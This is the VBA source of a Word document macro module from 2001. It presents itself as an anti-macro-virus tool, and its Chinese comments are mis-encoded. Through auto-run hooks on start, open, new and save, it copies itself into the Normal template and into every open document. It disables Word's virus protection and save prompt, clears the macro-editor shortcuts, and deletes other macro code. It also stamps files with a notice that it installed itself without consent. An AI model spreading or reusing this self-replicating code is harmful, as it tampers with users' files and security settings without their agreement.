   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "JiShenhua3"
   ' ------------------------------------------------------------------------------------
   ' Ô×÷: FoxChit SOFTWARE SOLUTIONS
   ' ×÷Õß: Ulysses R. Gotera
   ' ³ÌÐò¸Ä½ø: ¼½É÷»ª
   ' ÈÕÆÚ: 2001Äê3ÔÂ
   ' ¹¦ÄÜ: ¸Ã³ÌÐò°ÑWORD²Ëµ¥Óë¹¤¾ßÌõ³õÊ¼»¯µ½ÔÀ´×´Ì¬²¢É¾³ý±¾Ä£¿éÒÔÍâµÄºêÄ£¿é.
   '-------------------------------------------------------------------------------------
   Sub Immunize()
   On Error Resume Next

       Dim DocuName$, OpenDocImmunized As Boolean
       Dim I%, J%, NmImmunized As Boolean
       Dim LinesofCode As Integer
       Dim openDoc As Document

       NmImmunized = False

       For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
           DocuName = NormalTemplate.VBProject.VBComponents(I).Name
           Select Case DocuName
           Case "JiShenhua3"
               NmImmunized = True
           Case "ThisDocument"
               LinesofCode = NormalTemplate.VBProject.VBComponents(I).CodeModule.CountOfLines
               If LinesofCode > 0 Then
                   NormalTemplate.VBProject.VBComponents(I).CodeModule.DeleteLines 1, LinesofCode
               End If
           Case "VirusReport", "JiShenhua" '¾É°æ±¾É±²¡¶¾³ÌÐò
               Application.OrganizerDelete _
                   Source:=NormalTemplate.FullName, Name:=DocuName _
                   , Object:=wdOrganizerObjectProjectItems
           Case Else
               msg = "ÄãµÄ Word ÏµÍ³ÖÐ¸½´øÓÐºê³ÌÐòÄ£¿é " + DocuName + _
                   ", ¼«ÓÐ¿ÉÄÜÊÇºê²¡¶¾,ÇëÑ¡Ôñ 'ÊÇ' Çå³ý¸Ã²¡¶¾."
               If MsgBox(msg, vbYesNo, "¼½É÷»ªÏòÄú±¨¸æ:") = vbYes Then
                   Application.OrganizerDelete _
                       Source:=NormalTemplate.FullName, Name:=DocuName _
                       , Object:=wdOrganizerObjectProjectItems
               End If
           End Select
       Next I

       For Each openDoc In Documents
           OpenDocImmunized = False
           With openDoc
               For J = openDoc.VBProject.VBComponents.Count To 1 Step -1
                   DocuName = openDoc.VBProject.VBComponents(J).Name
                   Select Case DocuName
                       Case "JiShenhua3"
                           OpenDocImmunized = True
                       Case "ThisDocument"
                           LinesofCode = openDoc.VBProject.VBComponents(J).CodeModule.CountOfLines
                           If LinesofCode > 0 Then
                               openDoc.VBProject.VBComponents(J).CodeModule.DeleteLines 1, LinesofCode
                           End If
                       Case "Reference to Normal"
                       Case "VirusReport", "JiShenhua" '¾É°æ±¾É±²¡¶¾³ÌÐò
                           Application.OrganizerDelete Source:=openDoc.FullName, _
                               Name:=DocuName, Object:=wdOrganizerObjectProjectItems
                       Case Else
                           msg = "ÄúµÄÎÄ¼þ <" + openDoc.Name + "> ÖÐ¸½´øÓÐ Word ºêÄ£¿é " + DocuName + _
                               ", ¼«ÓÐ¿ÉÄÜÊÇºê²¡¶¾,ÇëÑ¡Ôñ 'ÊÇ' Çå³ý¸Ã²¡¶¾."
                           If MsgBox(msg, vbYesNo, "¼½É÷»ªÏòÄú±¨¸æ:") = vbYes Then
                               Application.OrganizerDelete Source:=openDoc.FullName, _
                                   Name:=DocuName, Object:=wdOrganizerObjectProjectItems
                           End If
                   End Select
               Next J

               If Not OpenDocImmunized Then
                   Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                   Destination:=openDoc.FullName, _
                   Name:="JiShenhua3", _
                   Object:=wdOrganizerObjectProjectItems
   '                If Not openDoc.Saved Then openDoc.SaveAs FileName:=openDoc.FullName
               End If
           End With
       Next openDoc

       If Not NmImmunized Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, Name:="JiShenhua3", _
            Object:=wdOrganizerObjectProjectItems
           If Not NormalTemplate.Saved Then NormalTemplate.Save
       End If

   End Sub
   Sub Initialize()
   On Error Resume Next

      Application.DisplayAlerts = wdAlertsAll
      WordBasic.DisableAutoMacros -1

       With Application
           .UserAddress = "¼½É÷»ªÒÑÎªÄúµÄ»úÆ÷×Ô¶¯°²×°ÁË·´ºê²¡¶¾³ÌÐò,ÊÂÇ°Î´Õ÷ÇóÄúµÄÍ¬Òâ,Çë¼ûÁÂ."
       End With

       With Dialogs(wdDialogFileSummaryInfo)
           .Comments = "¸ÃÎÄ¼þÒÑ¸½´øÁË¼½É÷»ª±àÐ´µÄ·´ºê²¡¶¾³ÌÐò,ÊÂÇ°Î´Õ÷ÇóÄúµÄÍ¬Òâ,Çë¼ûÁÂ."
           .Execute
       End With

       With Options
           .ConfirmConversions = True
           .VirusProtection = False
           .SaveNormalPrompt = False
       End With

       With ActiveDocument
           .ReadOnlyRecommended = False
       End With

      With CommandBars("Visual Basic")
         .Enabled = True
         .Protection = msoBarTypeMenuBar
         .Protection = msoBarMenuBar
      End With

      With CommandBars("Tools")
         .Reset
         .Controls("Macro").Reset
         .Controls("Customize...").Reset
         .Controls("ºê(&M)").Reset
         .Controls("×Ô¶¨Òå(&C)...").Reset
      End With

      FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
      FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
      CustomizationContext = NormalTemplate
   End Sub
   Sub AutoExec()
   On Error Resume Next
       Call Initialize
       Call Immunize
   End Sub
   Sub AutoNew()
   On Error Resume Next
       Call Initialize
       Call Immunize
       Dialogs(wdDialogFileNew).Show
       Call Immunize
   End Sub
   Sub FileNew()
   On Error Resume Next
       Call Initialize
       Call Immunize
       Dialogs(wdDialogFileNew).Show
       Call Immunize
   End Sub
   Sub AutoOpen()
   On Error Resume Next
      Call Initialize
      Call Immunize
   End Sub
   Sub FileOpen()
   On Error Resume Next
       Call Initialize
       Call Immunize
       Dialogs(wdDialogFileOpen).Show
       Call Immunize
   End Sub
   Sub FileSave()
   On Error Resume Next
       Call Initialize
       Call Immunize
       If Not ActiveDocument.Saved Then ActiveDocument.Save
   End Sub
   Sub FileSaveAs()
   On Error Resume Next
       Call Initialize
       Call Immunize
       Dialogs(wdDialogFileSaveAs).Show
       Call Immunize
   End Sub
   'Sub FileClose()
   'On Error Resume Next
   '    Call Initialize
   '    Call Immunize
   '    If Not ActiveDocument.Saved Then ActiveDocument.Save
   '    ActiveDocument.Close
   'End Sub
   'Sub FileExit()
   'On Error Resume Next
   '    Call Initialize
   '    Call Immunize
   '    If Not ActiveDocument.Saved Then ActiveDocument.Save
   '    FoxChitForm.Show
   '    Application.Quit
   'End Sub
